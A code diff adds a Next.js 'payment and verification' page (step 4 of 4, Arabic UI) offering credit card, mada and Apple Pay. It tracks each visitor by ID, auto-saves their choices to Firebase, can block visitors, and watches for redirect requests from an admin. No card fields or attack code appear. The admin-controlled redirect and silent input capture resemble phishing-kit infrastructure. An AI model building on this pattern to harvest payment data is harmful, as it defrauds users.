@@ -1,0 +1,151 @@
+"use client"
+
+import { useEffect, useState } from "react"
+import { useRouter } from "next/navigation"
+import { Button } from "@/components/ui/button"
+import { Input } from "@/components/ui/input"
+import { FullPageLoader } from "@/components/loader"
+import { getOrCreateVisitorID, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
+import { useAutoSave } from "@/hooks/use-auto-save"
+import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
+import { addData } from "@/lib/firebase"
+// PaymentPage will be integrated later
+
+export default function CheckPage() {
+  const router = useRouter()
+  const [visitorID] = useState(() => getOrCreateVisitorID())
+  const [loading, setLoading] = useState(true)
+  const [isBlocked, setIsBlocked] = useState(false)
+  
+  // Payment method
+  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("credit-card")
+  
+  // Auto-save payment method
+  useAutoSave({
+    visitorId: visitorID,
+    pageName: "check",
+    data: {
+      selectedPaymentMethod
+    }
+  })
+  
+  // Monitor redirect requests from admin
+  useRedirectMonitor({
+    visitorId: visitorID,
+    currentPage: "check"
+  })
+  
+  // Initialize on mount
+  useEffect(() => {
+    const init = async () => {
+      // Check if blocked
+      const blocked = await checkIfBlocked(visitorID)
+      if (blocked) {
+        setIsBlocked(true)
+        setLoading(false)
+        return
+      }
+      
+      // Update current page
+      await updateVisitorPage(visitorID, "check", 4)
+      
+      setLoading(false)
+    }
+    
+    init()
+  }, [visitorID])
+  
+  // Handle back
+  const handleBack = () => {
+    router.push('/compar')
+  }
+  
+  if (loading) {
+    return <FullPageLoader />
+  }
+  
+  if (isBlocked) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-gray-50">
+        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
+          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
+          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
+        </div>
+      </div>
+    )
+  }
+  
+  return (
+    <div className="min-h-screen bg-gray-50 py-8">
+      <div className="max-w-4xl mx-auto px-4">
+        <div className="bg-white rounded-lg shadow-lg p-8">
+          <h1 className="text-3xl font-bold text-center mb-2">الدفع والتحقق</h1>
+          <p className="text-center text-gray-600 mb-8">الخطوة 4 من 4</p>
+          
+          {/* Payment Method Selection */}
+          <div className="mb-8">
+            <label className="block text-sm font-medium mb-4">اختر طريقة الدفع</label>
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+              <button
+                type="button"
+                onClick={() => setSelectedPaymentMethod("credit-card")}
+                className={`p-4 border-2 rounded-lg transition-all ${
+                  selectedPaymentMethod === "credit-card"
+                    ? 'border-blue-500 bg-blue-50'
+                    : 'border-gray-200 hover:border-blue-300'
+                }`}
+              >
+                <div className="text-center">
+                  <div className="text-2xl mb-2">💳</div>
+                  <p className="font-semibold">بطاقة ائتمان</p>
+                </div>
+              </button>
+              
+              <button
+                type="button"
+                onClick={() => setSelectedPaymentMethod("mada")}
+                className={`p-4 border-2 rounded-lg transition-all ${
+                  selectedPaymentMethod === "mada"
+                    ? 'border-blue-500 bg-blue-50'
+                    : 'border-gray-200 hover:border-blue-300'
+                }`}
+              >
+                <div className="text-center">
+                  <div className="text-2xl mb-2">🏦</div>
+                  <p className="font-semibold">مدى</p>
+                </div>
+              </button>
+              
+              <button
+                type="button"
+                onClick={() => setSelectedPaymentMethod("apple-pay")}
+                className={`p-4 border-2 rounded-lg transition-all ${
+                  selectedPaymentMethod === "apple-pay"
+                    ? 'border-blue-500 bg-blue-50'
+                    : 'border-gray-200 hover:border-blue-300'
+                }`}
+              >
+                <div className="text-center">
+                  <div className="text-2xl mb-2">🍎</div>
+                  <p className="font-semibold">Apple Pay</p>
+                </div>
+              </button>
+            </div>
+          </div>
+          
+          {/* Payment Form - To be integrated */}
+          <div className="mb-6 bg-gray-50 rounded-lg p-6 text-center">
+            <p className="text-gray-600">نموذج الدفع سيتم دمجه قريباً</p>
+            <p className="text-sm text-gray-500 mt-2">يمكنك المتابعة للخطوة التالية</p>
+          </div>
+          
+          <div className="flex gap-4">
+            <Button type="button" onClick={handleBack} variant="outline" className="flex-1">
+              السابق
+            </Button>
+          </div>
+        </div>
+      </div>
+    </div>
+  )
+}
